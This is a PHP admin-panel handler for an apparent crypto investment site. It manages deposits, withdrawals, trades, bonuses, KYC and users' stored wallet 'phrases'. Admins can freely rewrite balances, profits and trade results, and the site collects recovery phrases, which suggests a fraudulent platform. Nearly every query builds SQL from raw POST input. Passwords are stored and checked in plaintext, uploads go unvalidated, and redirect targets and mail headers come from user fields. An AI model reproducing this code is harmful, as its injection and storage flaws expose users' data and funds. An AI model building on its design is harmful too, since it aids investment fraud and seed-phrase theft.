<?php
include('security.php');
require '../details.php';
require '../admin.php';

if (isset($_POST['register'])) {

	$username = $_POST['username'];
	$email = $_POST['email'];
	$pass = $_POST['password'];
	$cpass = $_POST['cpassword'];
	$usertype = $_POST['usertype'];

	if ($pass === $cpass) {

		$sql = "INSERT INTO admin (user_name, email, password, usertype) VALUES('$username', '$email', '$pass', '$usertype')";
		$run = mysqli_query($conn, $sql);

		if ($run) {
			$_SESSION['success'] = "Admin Profile Added";
			header('location: register.php');
		} else {
			$_SESSION['status'] = "Admin Profile Not Added";
			header('location: register.php');
		}

	} else {
		$_SESSION['status'] = "Password And Confirm Password Doesn't Match ";
			header('location: register.php');
	}

}

if (isset($_POST['save_site'])) {
	$site = $_POST['sitename'];
	$logo = $_FILES['logo']['name'];
	$phone = $_POST['phone'];
	$address = $_POST['address'];
	$email = $_POST['email'];
	$ref = $_POST['ref'];
	$btc = $_POST['btc'];
	$eth = $_POST['eth'];
	$trc = $_POST['trc'];
	$erc = $_POST['erc'];
	$fav = $_FILES['fav']['name'];

		if ($logo == null) {
			$sql = "UPDATE page_content SET site_name= '$site', ref='$ref', btc='$btc', eth='$eth', trc='$trc', erc='$erc', fav = '$fav', email = '$email', phone = '$phone', address = '$address'";
		$run = mysqli_query($conn, $sql);

		if ($run) {
			move_uploaded_file($_FILES['fav']['tmp_name'], '../uploads/'.$_FILES['fav']['name']);
			$_SESSION['success'] = "Updated";
			header('location: homepage.php');
		} else {
			$_SESSION['status'] = "Not Updated";
			header('location: homepage.php');
		}
	} elseif ($fav == null) {
		$sql = "UPDATE page_content SET site_name= '$site', email = '$email', ref='$ref', btc='$btc', eth='$eth', trc='$trc', erc='$erc', logo= '$logo', phone = '$phone', address = '$address'";
		$run = mysqli_query($conn, $sql);
	
		if ($run) {
		move_uploaded_file($_FILES['logo']['tmp_name'], '../uploads/'.$_FILES['logo']['name']);
			$_SESSION['success'] = "Updated";
			header('location: homepage.php');
		} else {
			$_SESSION['status'] = "Not Updated";
			header('location: homepage.php');
		}
	} else {
		$sql = "UPDATE page_content SET site_name= '$site',  fav = '$fav', ref='$ref', btc='$btc', eth='$eth', trc='$trc', erc='$erc', email = '$email', logo= '$logo', phone = '$phone', address = '$address'";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		move_uploaded_file($_FILES['fav']['tmp_name'], '../uploads/'.$_FILES['fav']['name']);
		move_uploaded_file($_FILES['logo']['tmp_name'], '../uploads/'.$_FILES['logo']['name']);
			$_SESSION['success'] = "Updated";
			header('location: homepage.php');
		} else {
			$_SESSION['status'] = "Not Updated";
			header('location: homepage.php');
		}
	}
	
}

if (isset($_POST['mail'])) {
    $email = $_POST['email'];
    $mailer = $_POST['mailer'];
    $subject = $_POST['subject'];
    $message_u = $_POST['message'];
    
    $sql = "SELECT * FROM user WHERE email = '$email'";
    $run = mysqli_query($conn, $sql);
    $row = $run -> fetch_array(MYSQLI_ASSOC);
    
    if ($message_u != null && $mailer != null && $email != null) {
        
        $sql = "INSERT INTO mails (mailer, subject, user, message) VALUES ('$mailer', '$subject', '$email', '$message_u')";
        $run = mysqli_query($conn, $sql);
        
		$to = $email;
		$subject = $subject;
		$message = '
		<div style="background-color: rgb(175, 175, 175); padding: 30px;">
			<div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
				<h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
				<center>
					<img src="https://'.DOMAIN.'/uploads/'.LOGO.'" style="filter: invert(100%);" width="100%" height="30%" alt="LOGO">
    				<br>
    				<h4 style="text-align: center; padding: 10px;">Hello, '. $row['first_name'] .'</h4><br>
    				<p style="text-align: center; padding: 10px;">'.$message_u.'</p>
    				<br>
    				<br>
    			</center>
				<p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
			</div>
		</div>
		';
		
		
		
		// Always set content-type when sending HTML email
		$headers = "MIME-Version: 1.0" . "\r\n";
		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		
		// More headers
		$headers .= 'From: '.NAME.' <'.$mailer.'>' . "\r\n";
		
		mail($to,$subject,$message,$headers);
		
		$_SESSION['success'] = "Mail sent successfully";
		header('location: mail.php');
            
    } else {
        $_SESSION['status'] = "Mail not sent";
        header('location: mail.php');
    }
}

if (isset($_POST['delete_logo'])) {
	$id = 1;

	$sql = "UPDATE page_content SET logo = NULL WHERE id= '$id'";
	$run = mysqli_query($conn, $sql);

	if ($run) {
			$_SESSION['success'] = "Logo DELETED";
			header('location: homepage.php');
		} else {
			$_SESSION['status'] = "Logo Not DELETED";
			header('location: homepage.php');
		}
}

if (isset($_POST['delete_fav'])) {
	$id = 1;

	$sql = "UPDATE page_content SET fav = NULL WHERE id= '$id'";
	$run = mysqli_query($conn, $sql);

	if ($run) {
			$_SESSION['success'] = "Fav DELETED";
			header('location: homepage.php');
		} else {
			$_SESSION['status'] = "Fav Not DELETED";
			header('location: homepage.php');
		}
}

if (isset($_POST['plan_edit'])) {
    $id = $_POST['id'];
	$pair = $_POST['pair'];
	$min = $_POST['min'];
	$max = $_POST['max'];
	$prof = $_POST['prof'];
	$duration = $_POST['duration'];
	$status = $_POST['status'];

	$sql = "UPDATE plan SET name = '$pair', min = '$min', max= '$max', per= '$prof', status= '$status', duration = '$duration' WHERE id='$id'";
    $run = mysqli_query($conn, $sql);
    if ($run) {
		$_SESSION['success'] = "Plan updated Successfully";
		header('location: plan.php');
	} else {
		$_SESSION['status'] = "Plan not updated";
		header('location: plan.php');
	}
}

if (isset($_POST['trade_edit'])) {

    function getAdvertEndDate ($startDate, $trade_hrs){
		if ($trade_hrs != null) {
			return date("Y-m-d h:i:s", strtotime($startDate) + ($trade_hrs * 3600));
		}
	}
    $file = $_POST['file'];
	$id = $_POST['id'];
	$user = $_POST['user'];
	$u_bal = $_POST['u_bal'];
	$pair = $_POST['pair'];
	$amt = $_POST['amt'];
	$status = $_POST['status'];
	$prof = $_POST['prof'];
	$trade_hrs = $_POST['trade_hrs'];
	$startDate = date('Y-m-d h:i:s');
	$end_date = getAdvertEndDate($startDate, $trade_hrs);

    // echo $u_bal;
    // echo '<br>';
    // echo $amt;

	if ($u_bal < $amt) {
	    $_SESSION['status'] = "Insufficient balance for user";
	    header('location: '.$file);
	} else {
	    $sql = "SELECT * FROM user WHERE acct_id = '$user'";
    	$run = mysqli_query($conn, $sql);
    	$row = $run->fetch_array(MYSQLI_ASSOC);

    	if ($amt != null) {
    		$sql = "UPDATE trade SET create_date = '$startDate', trade_duration = '$trade_hrs', pair= '$pair', amount= '$amt', status= '$status', profit = '$prof', end_date = '$end_date' WHERE id='$id'";
    		$run = mysqli_query($conn, $sql);
    		$new_bal = $row['balance'] - $amt;

    		if ($run) {
    			$sql = "UPDATE user SET balance = '$new_bal' WHERE acct_id = '$user'";
    			$run = mysqli_query($conn, $sql);

    			$_SESSION['success'] = "Trade Updated";
    			header('location: '.$file);

    		} else {
    			$_SESSION['status'] = "Trade Not Updated";
    			header('location: '.$file);
    		}
    	} else {
    		$sql = "UPDATE trade  SET pair= '$pair', create_date = '$startDate', trade_duration = '$trade_hrs', status= '$status', profit = '$prof', end_date= '$end_date'WHERE id='$id'";
    		$run = mysqli_query($conn, $sql);
    		$new_bal = $row['balance'] - $amt;

    		if ($run) {
    			$_SESSION['success'] = "Trade Updated";
    			header('location: '.$file);

    		} else {
    			$_SESSION['status'] = "Trade Not Updated";
    			header('location: '.$file);
    		}
    	}
    }
}

if (isset($_POST['approve_deposit'])) {
      $id = $_POST['approve_serial'];
      $status = 1;
      $email = $_POST['email'];
      $user = $_POST['user_id'];
      $amt = $_POST['amt'];
      $pair = $_POST['pair'];

      $sql = "UPDATE transaction SET serial = $status, amt = '$amt', name = '$pair' WHERE trx_id = '$id' ";
      $run = mysqli_query($conn, $sql);

      if ($run) {
        $sql = "SELECT * FROM user WHERE acct_id = '$user'";
        $run = mysqli_query($conn, $sql);
        $result = $run->fetch_array(MYSQLI_ASSOC);
        if ($result['balance'] != null) {
          $add_bal = $result['balance'] + $amt;
          $sql = "UPDATE user SET balance = '$add_bal' WHERE acct_id = '$user'";
          $run_d = mysqli_query($conn, $sql);
            if ($run_d) {
              // email and session
                $to = $email;
    	        $subject = "Deposit Processed";
    	        
    	        $message = '
                    <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                        <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                            <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                            <center>
                                <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                            </center>
                            <br>
                            <p style="text-align: center; padding: 10px;">This is to infrom you that your deposit of $'.$amt.' has been received and confirmed.</p>
                            <br>
                            <br>
                            <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
                        </div>
                    </div>
    	        ';
    	        
    	        // Always set content-type when sending HTML email
    	        $headers = "MIME-Version: 1.0" . "\r\n";
    	        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    	        
    	        // More headers
    	        $headers .= 'From: '.NAME.' <'.EMAIL.'>' . "\r\n";
    	        
    	        mail($to,$subject,$message,$headers);
    	        
    	        $_SESSION['success'] = "Successful";
                header('location: deposit.php');
            } else {
              // err msg
              
               $_SESSION['status'] = "Program error, kindly contact programmer";
                header('location: deposit.php');
            }
        } else {
        // echo "ERROR";
        
            $_SESSION['status'] = "Program error, kindly contact programmer";
            header('location: deposit.php');
        }
      }
    }

if (isset($_POST['decline_deposit'])) {
  $id = $_POST['serial'];
  $status = 2;
  $email = $_POST['email'];
  $amt = $_POST['amt'];
  $pair = $_POST['pair'];

  $sql = "UPDATE transaction SET serial='$status', amt = '$amt', name = '$pair' WHERE trx_id = '$id'";
  $run = mysqli_query($conn, $sql);

  if ($run) {
    // mail
    $to = $email;
    $subject = "Deposit Declined";
    
    $message = '
        <div style="background-color: rgb(175, 175, 175); padding: 30px;">
            <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                <center>
                    <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                </center>
                <br>
                <p style="text-align: center; padding: 10px;">This is to infrom you that your deposit of $'.$amt.' was declined.</p>
                <br>
                <br>
                <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
            </div>
        </div>
    ';
    
    // Always set content-type when sending HTML email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    
    // More headers
    $headers .= 'From: '.NAME.' <'.EMAIL.'>' . "\r\n";
    
    mail($to,$subject,$message,$headers);
    
    $_SESSION['success'] = "Successful";
    header('location: deposit.php');
  } else {
    // email
    
    $_SESSION['status'] = "Program error, kindly contact programmer";
    header('location: deposit.php');
  }

}

if (isset($_POST['delete_deposit'])) {
  $id = $_POST['id'];

    $sql = "DELETE FROM transaction WHERE id = '$id'";
    $run = mysqli_query($conn, $sql);
    
    if ($run) {
        $_SESSION['success'] = 'Deleted Successfully';
        header('location: deposit.php');
    } else {
        $_SESSION['status'] = "Program error, contact programmer";
        header('location: deposit.php');
    }
}

if (isset($_POST['approve_wth'])) {
  $email = $_POST['email'];
  $trx_id = $_POST['approve_status'];
  $user = $_POST['user_id'];
  $amt = $_POST['amt'];
  $status = 1;
  
  $sql = "UPDATE transaction SET serial = $status WHERE trx_id = '$trx_id' ";
  $run = mysqli_query($conn, $sql);
  if ($run) {
       // email and session
        $to = $email;
        $subject = "Withdraw Processed";
        
        $message = '
            <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                    <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                    <center>
                        <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                    </center>
                    <br>
                    <p style="text-align: center; padding: 10px;">This is to infrom you that your withdraw request of $'.$amt.' from your account has been confirmed and you will recieve it shortly.</p>
                    <br>
                    <br>
                    <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
                </div>
            </div>
        ';
        
        // Always set content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        
        // More headers
        $headers .= 'From:'.NAME.' <'.EMAIL.'>' . "\r\n";
        
        mail($to,$subject,$message,$headers);
        
        $_SESSION['success'] = "Successful";
        header('location: withdraw.php');
    } else {
           $_SESSION['status'] = "Program error, kindly contact programmer";
            header('location: withdraw.php');
    }
}

if (isset($_POST['decline_wth'])) {
  $file = $_POST['file'];
  $email = $_POST['email'];
  $trx_id = $_POST['status'];
  $user = $_POST['user_id'];
  $amt = $_POST['amt'];      
  $status = 2;
  $gate_way = $_POST['gate_way'];

  $sql = "UPDATE transaction SET serial = '$status' WHERE trx_id = '$trx_id'";
  $run = mysqli_query($conn, $sql);
  if ($run) {
        $sql = "SELECT * FROM user WHERE acct_id = '$user'";
        $run_ = mysqli_query($conn, $sql);
        $row = $run_->fetch_array(MYSQLI_ASSOC);
        
        if ($run_ && $gate_way == 1) {
            $add_bal = $row['balance'] + $amt;
            $sql = "UPDATE user SET balance = '$add_bal' WHERE acct_id = '$user'";
            $run_d = mysqli_query($conn, $sql);
            $to = $email;
            $subject = "Withdraw Declined";
            
            $message = '
                <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                    <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                        <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                        <center>
                            <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                        </center>
                        <br>
                        <p style="text-align: center; padding: 10px;">This is to infrom you that your withdraw request of $'.$amt.' from your account has been declined.</p>
                        <br>
                        <br>
                        <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
                    </div>
                </div>
            ';
            
            // Always set content-type when sending HTML email
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
            
            // More headers
            $headers .= 'From:'.NAME.' <'.EMAIL.'>' . "\r\n";
            
            mail($to,$subject,$message,$headers);
            // mail and session
            
            $_SESSION['success'] = "Successful";
            header('location: '.$file);   
            
        } elseif ($run_ && $gate_way == 2) {
            $add_bal = $row['profit'] + $amt;
            $sql = "UPDATE user SET profit = '$add_bal' WHERE acct_id = '$user'";
            $run_d = mysqli_query($conn, $sql);
            $to = $email;
            $subject = "Withdraw Declined";
            
            $message = '
                <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                    <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                        <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                        <center>
                            <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                        </center>
                        <br>
                        <p style="text-align: center; padding: 10px;">This is to infrom you that your withdraw request of $'.$amt.' from your account has been declined.</p>
                        <br>
                        <br>
                        <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
                    </div>
                </div>
            ';
            
            // Always set content-type when sending HTML email
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
            
            // More headers
            $headers .= 'From:'.NAME.' <'.EMAIL.'>' . "\r\n";
            
            mail($to,$subject,$message,$headers);
            // mail and session
            
            $_SESSION['success'] = "Successful for profit";
            header('location: '.$file);   
        }else {
            $_SESSION['status'] = "Program error, kindly contact programmer";
            header('location: withdraw.php');
        }
  } else {
       // err msg
       
        $_SESSION['status'] = "Program error, kindly contact programmer";
        header('location: withdraw.php');
  }

}

if (isset($_POST['delete_withdraw'])) {
    $id = $_POST['delete_wth'];

    $sql = "DELETE FROM transaction WHERE trx_id = '$id'";
    $run = mysqli_query($conn, $sql);
    
    if ($run) {
        $_SESSION['success'] = 'Deleted Successfully';
        header('location: withdraw.php');
    } else {
        $_SESSION['status'] = "Program error, contact programmer";
        header('location: withdraw.php');
    }
}

if (isset($_POST['proccess_trade'])) {
	$id = $_POST['id'];

	$sql = "UPDATE trade SET status = 1 WHERE id = $id";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = 'Trade Successfully Processed';
		header('location: index.php');
	} else {
		$_SESSION['status'] = 'An error occured';
	}
}

if (isset($_POST['del_trade'])) {
    $file = $_POST['file'];
	$id = $_POST['id'];

	$sql = "DELETE FROM trade WHERE id = $id";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = "Deleted successfully";
		header('location: '.$file);
	} else {
		$_SESSION['status'] = "An error occured";
		header('location: '.$file);
	}
}

if (isset($_POST['trade'])) {
	$id = 1;
	$trade_hrs = $_POST['trade_hrs'];
	$prof = $_POST['prof'];
	
	$sql = "UPDATE trade_set SET trade_hrs = '$trade_hrs', profit = '$prof' WHERE id = '$id'";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = "Successful";
		header('location: trade.php');
	} else {
		$_SESSION['status'] = "Error Occured";
		header('location: trade.php');
	}
	
}

if (isset($_POST['admin_btn'])) {
    $id = $_POST['edit_id'];
    $username = $_POST['edit_username'];
    $email = $_POST['edit_email'];
    $pass = $_POST['edit_password'];
    $image = $_FILES['edit_image']['name'];
    	if ($image == null) {
    		$sql = "UPDATE admin SET user_name='$username', email='$email', password='$pass' WHERE id='$id' ";
            $run = mysqli_query($conn, $sql);
    
            if ($run) {
                unset($_SESSION['username']);
    			header('location: login.php');
            } else {
                $_SESSION['status'] = '<p> Update Unsuccessful</p>';
                header('location: index.php');
            }

    	} else {
    		$sql = "UPDATE admin SET user_name='$username', email='$email',password='$pass', image='$image' WHERE id='$id' ";
            $run = mysqli_query($conn, $sql);
    
            if ($run) {
            	move_uploaded_file($_FILES['edit_image']['tmp_name'], '../uploads/'.$_FILES['edit_image']['name']);
                unset($_SESSION['username']);
    			header('location: login.php');
            } else {
                $_SESSION['status'] = '<p> Update Unsuccessful</p>';
                header('location: index.php');
            }
    	}
    }
    
if (isset($_POST['bonus'])) {
    $trx_id = uniqid();
    $user = $_POST['user'];
    $amount = $_POST['amount'];
    $serial = 1;
    $name = 'Bonus';
    $status = 'other';
    
    $sql_e = "SELECT * FROM user WHERE email = '$user'";
    $run_e = mysqli_query($conn, $sql_e);
    $e = $run_e->fetch_array(MYSQLI_ASSOC);
    
    $email = $e['email'];
    $user_id = $e['acct_id'];
    
    if ($user == null) {
        $_SESSION['status'] = "Kindly select user";
        header('location: other.php');
    } else {
        $sql = "INSERT INTO transaction (trx_id, user_id, amt, name, status, email, serial) VALUES ('$trx_id', '$user_id', '$amount', '$name', '$status', '$email', '$serial')";
        $run = mysqli_query($conn, $sql);
        
        if ($run) {
            // email and session
            $u_bal = $e['profit'];
            $n_bal = $amount + $u_bal;
            $sql = "UPDATE user SET profit = '$n_bal' WHERE acct_id = '$user_id'";
            $run_d = mysqli_query($conn, $sql);
            
            $to = $email;
            $subject = "Bonus Alert";
            
            $message = '
                <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                    <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                        <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                        <center>
                            <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" width="100%" height="30%" alt="LOGO">
                        </center>
                        <br>
                        <p style="text-align: center; padding: 10px;">Congratulations!! This is to infrom you that a bonus of $'.$amount.' has been added to your trading account due to your active participation. <br> We will always provide the best services and hope you achieve more on your trading journey with us. </p>
                        <br>
                        <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
                    </div>
                </div>
            ';
            
            // Always set content-type when sending HTML email
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
            
            // More headers
            $headers .= 'From: '.NAME.' <'.EMAIL.'>' . "\r\n";
            
            mail($to,$subject,$message,$headers);
            
            $_SESSION['success'] = "Successful";
            header('location: other.php');
        } else {
            $_SESSION['status'] = "Program error, kindly contact programmer";
            header('location: other.php');
        }
    }
}

if (isset($_POST['update_btn'])) {
	$id = $_POST['edit_id'];
	$username = $_POST['edit_username'];
	$email = $_POST['edit_email'];
	$pass = $_POST['edit_password'];
	$status = $_POST['status'];

	$sql = "UPDATE admin SET user_name='$username', email='$email',password='$pass', status=$status WHERE id='$id' ";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = '<p> Update Successful</p>';
		header('location: register.php');
	} else {
		$_SESSION['status'] = '<p> Update Unsuccessful</p>';
		header('location: register.php');
	}
} elseif (isset($_POST['updatebtn'])) {
    $file = $_POST['file'];
	$id = $_POST['edit_id'];
	$fname = $_POST['edit_fname'];
	$lname = $_POST['edit_lname'];
	$user_bal = $_POST['user_bal'];
	$ip_address = $_POST['ip_address'];
	$profit = $_POST['profit'];
	$email = $_POST['edit_email'];
	$phone = $_POST['phone'];
	$pass = $_POST['edit_password'];
	$t_btn = $_POST['t_btn'];
	$status = $_POST['status'];
	$trade_per = $_POST['trade_per'];
	$acct_stat = $_POST['acct_stat'];
	$wth_amt_u = $_POST['wth_amt_u'];
	$wth_amt_status = $_POST['wth_amt_status'];
	$kyc = $_POST['kyc'];
	
	if ($status == 3) {
	    $sql_ = "INSERT INTO banned_ip (first_name, last_name, ip_address) VALUES ('$fname', '$lname', '$ip_address')";
 		$run_ = mysqli_query($conn, $sql_);
 		
 		if ($run_) {
 		    $sql = "UPDATE user SET first_name='$fname', wth_amt_status = '$wth_amt_status', wth_amt = '$wth_amt_u', acct_stat = '$acct_stat', trade_btn = '$t_btn', trade_per = $trade_per, last_name='$lname', profit = '$profit', balance ='$user_bal', phone='$phone', email='$email', password='$pass', status = $status, kyc = '$kyc' WHERE id='$id' ";
        	$run = mysqli_query($conn, $sql);
        
        	if ($run) {
        		$_SESSION['success'] = '<p>Update Successful</p>';
        		header('location: '.$file);
        	} else {
        		$_SESSION['status'] = "<p>Update Unsuccessful</p>";
        		header('location:'.$file);
        	}
 		} else {
 		    $to = Admin_Email;
	        $subject = "Error with banned ip";
	        
	        $message = '
                <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                    <div style="text-align: center; max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                        <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                        <center>
                            <img src="https://'.DOMAIN.'/uploads/'.LOGO.'" width="100%" height="180" alt="LOGO">
                        </center>
                        <h4>Hello Admin</h4><br>
                        <p style="color: red;">ALERT!!</p>
                        <p>An banned ip error in your codes.</p>
                        <br>
                        <br>
                        <p style="text-align: center; font-size: 10px;">&copy; '.NAME.', '.date('Y').'</p>
                    </div>
                </div>
	        ';
	        
	        // Always set content-type when sending HTML email
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	        
	        // More headers
	        $headers .= 'From:'.NAME.' <'.EMAIL.'>' . "\r\n";
	        
	        mail($to,$subject,$message,$headers);
 		}
	} else {
	    
	    $sql_ = "DELETE FROM banned_ip WHERE ip_address = '$ip_address' ";
 		$run_ = mysqli_query($conn, $sql_);
 		
 		if ($run_) {
 		    $sql = "UPDATE user SET first_name='$fname', wth_amt_status = '$wth_amt_status', wth_amt = '$wth_amt_u', acct_stat = '$acct_stat', trade_btn = '$t_btn', trade_per = $trade_per, last_name='$lname', profit = '$profit', balance ='$user_bal', phone='$phone', email='$email', password='$pass', status = $status, kyc = '$kyc' WHERE id='$id' ";
        	$run = mysqli_query($conn, $sql);
        
        	if ($run) {
        		$_SESSION['success'] = '<p>Update Successful</p>';
        		header('location: '.$file);
        	} else {
        		$_SESSION['status'] = "<p>Update Unsuccessful</p>";
        		header('location:'.$file);
        	}
 		} else {
 		    echo 'error';
 		}
	}
}

if (isset($_POST['delete_btn'])) {
	$id = $_POST['delete_admin'];

	$sql = "DELETE FROM admin WHERE id= $id ";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = '<p> Admin DELETED </p>';
		header('location: register.php');
	} else {
		$_SESSION['status'] = '<p> Admin Not DELETED</p>';
		header('location: register.php');
	}
}

if (isset($_POST['delete'])) {
	$id = $_POST['delete_id'];

	$sql = "DELETE FROM user WHERE id= $id ";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = '<p> User DELETED</p>';
		header('location: users.php');
	} else {
		$_SESSION['status'] = '<p> User Not DELETED</p>';
		header('location: users.php');
	}
}

if (isset($_POST['clear'])) {
  	
      $sql = "DELETE FROM trade";
      $run = mysqli_query($conn, $sql);
       if ($run) {
            $_SESSION['success'] = '<p> Successful</p>';
            header('location: index.php');
        } else {
            $_SESSION['status'] = '<p> Unsuccessful</p>';
            header('location: index.php');
        }
    

      }

if (isset($_POST['login_btn'])) {
	$username_login = $conn -> real_escape_string($_POST['username']);
	$password_login = $conn -> real_escape_string($_POST['password']);

	$sql = "SELECT * FROM admin WHERE user_name='$username_login' AND password='$password_login'  ";
	$run = mysqli_query($conn, $sql);
	
	if (mysqli_fetch_array($run)) {
		$_SESSION['username'] = $username_login;
		header('location: index.php');
	} else {
		$_SESSION['status'] = 'Invalid input';
		header('location: login.php');
	}
	
}

if (isset($_POST['c_wallet'])) {
    $file = $_POST['file'];
	
	if (isset($_POST['kyc_id']) && $_POST['kyc_id'] != null) {
	    $id = $_POST['kyc_id'];

    	$sql = "UPDATE user SET card_stat = 1 WHERE id = $id";
    	$run = mysqli_query($conn, $sql);
    
    	if ($run) {
    		$_SESSION['success'] = "KYC Verified Successful";
    		header('location: '.$file);
    	} else {
    		$_SESSION['status'] = "Verification Error";
    		header('location: '.$file);
    	}
	} elseif (isset($_POST['id']) && $_POST['id'] != null) {
	    $id = $_POST['id'];
	    $sql = "UPDATE user SET wallet_stat = 1 WHERE id = $id";
    	$run = mysqli_query($conn, $sql);
    
    	if ($run) {
    		$_SESSION['success'] = "Wallet Connected Successful";
    		header('location: '.$file);
    	} else {
    		$_SESSION['status'] = "Connection Error";
    		header('location: '.$file);
    	}
	}
}

if (isset($_POST['delete_wallet'])) {
    $file = $_POST['file'];
	$id = $_POST['id'];
	$sql = "UPDATE user SET phrase = NULL, wallet_stat = 0 WHERE id= '$id'";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = "Phrase  DELETED";
		header('location: '.$file);
	} else {
		$_SESSION['status'] = "Phrase Not DELETED";
		header('location: '.$file);
	}
}

if (isset($_POST['delete_kyc'])) {
    $file = $_POST['file'];
	$id = $_POST['kyc_id'];
	$sql = "UPDATE user SET card = NULL, s_card = NULL, card_stat = 0 WHERE id= '$id'";
	$run = mysqli_query($conn, $sql);

	if ($run) {
		$_SESSION['success'] = "KYC  DELETED";
		header('location: '.$file);
	} else {
		$_SESSION['status'] = "KYC Not DELETED";
		header('location: '.$file);
	}
}

if (isset($_POST['edit_btn'])) {


include('includes/header.php');
include('includes/navbar.php');
?>

<div class="container-fluid">
	 <!-- DataTales Example -->
    <div class="card shadow mb-4">
        <div class="card-header py-3">
            <h6 class="m-0 font-weight-bold text-primary">Edit Admin Profile</h6>
        </div>
        <div class="card-body">
        	<?php 

        		if (isset($_POST['edit_btn'])) {
        			$id = $_POST['edit_id'];

        			$sql = "SELECT * FROM admin WHERE id='$id' ";
        			$run = mysqli_query($conn, $sql);
        		}

        		foreach ($run as $row) {

        	?>
        		
        <form method="POST" action="code.php">
        	<input type="hidden" name="edit_id" value="<?php echo $row['id'] ?>">
        	<div class="form-group">
	        	<label> Username </label>
	        	<input type="text" name="edit_username" value="<?php echo $row['user_name'] ?>" class="form-control" readonly required>
	        </div>
	        <div class="form-group">
	        	<label> Email </label>
	        	<input type="email" name="edit_email" value="<?php echo $row['email'] ?>" class="form-control" readonly required>
	        </div>
	        <div class="form-group">
	        	<label> Passsword </label>
	        	<input type="password" name="edit_password"value="<?php echo $row['password'] ?>"  class="form-control" readonly required>
	        </div>
	        <div class="form-group">
	          	<label>Status</label>
	            <select class="form-control" name="status">
	              <option value="1">active</option>
	              <option value="0">Inactive</option>
	            </select>
	          </div><br>
	        <div>
	        	<a href="register.php" class="btn btn-danger">CANCEL</a>
	        	<button type="submit" name="update_btn" class="btn btn-primary">UPDATE</button>
	        </div>
	    </form>
	   <?php

	        }
        	
        ?>

        </div>
    </div>
</div>


<?php 
include('includes/script.php');
include('includes/footer.php');

}